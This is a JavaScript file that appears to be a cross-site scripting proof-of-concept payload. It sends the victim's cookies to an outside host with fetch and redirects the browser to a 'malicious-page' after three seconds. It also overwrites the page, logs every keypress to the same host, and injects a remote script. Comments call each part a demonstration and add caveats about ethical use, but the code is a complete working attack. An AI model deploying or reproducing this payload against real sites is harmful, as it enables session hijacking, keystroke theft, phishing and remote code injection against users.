// Log that the payload executed (proof of concept)
console.log("Payload.js loaded successfully");

// Example 1: Log cookies for demonstration (only use for your account)
fetch('https://yourdomain.com/log?cookie=' + encodeURIComponent(document.cookie))
    .then(response => console.log("Cookie logged successfully"))
    .catch(error => console.error("Error logging cookie:", error));

// Example 2: Redirect user to a controlled page (demonstrating phishing or redirection risks)
setTimeout(() => {
    window.location.href = 'https://yourdomain.com/malicious-page';
}, 3000); // Redirect after 3 seconds for testing

// Example 3: Modify the DOM to demonstrate visual tampering
document.body.innerHTML = '<h1 style="color: red; text-align: center;">Page Compromised!</h1><p>This is a demonstration of XSS vulnerability.</p>';

// Example 4: Keylogger to demonstrate input monitoring (use ethically for testing)
document.addEventListener('keypress', (e) => {
    fetch('https://yourdomain.com/log?key=' + e.key)
        .then(response => console.log("Key logged:", e.key))
        .catch(error => console.error("Error logging key:", error));
});

// Example 5: Load an external script (demonstrating code injection)
const script = document.createElement('script');
script.src = 'https://yourdomain.com/external-payload.js'; // Replace with your actual domain
document.head.appendChild(script);

